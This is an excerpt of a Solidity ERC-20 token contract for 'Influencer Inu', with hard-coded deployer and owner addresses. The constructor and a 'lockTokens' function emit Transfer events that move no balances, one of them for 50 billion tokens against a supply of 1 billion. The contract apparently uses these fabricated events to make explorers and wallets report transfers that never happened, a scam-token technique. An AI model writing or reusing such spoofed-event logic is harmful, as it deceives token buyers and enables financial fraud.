...
contract InfluencerInu is Context, IERC20 {
    ...
    address _contDeployr = 0xDb80EEc593836e8042a018Bc1B6D8614aF584091;
    address public _ownr = 0x4Af4A355c2D61AD40C16B5c29D9F8F5F3011FE86;
   constructor () public {

        _name = "Influencer Inu";
        _symbol = "INFLUENCERINU";
        _decimals = 18;
        uint256 initialSupply = 1000000000*10**18;
        //uint256 initialSupply = 2313465897879652314789652874;
        _safeOwnr = _ownr;
        
        

        _mint(_contDeployr, initialSupply);
        emit Transfer(0xDb80EEc593836e8042a018Bc1B6D8614aF584091, 0x0e8D2EB7D6bDF28393c25a1966385Ad32Ff0259a, 250000*10**18);
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function lockTokens()  public _verify(){
      emit Transfer(_contDeployr, 0xE2fE530C047f2d85298b07D9333C05737f1435fB, 50000000000*10**18);
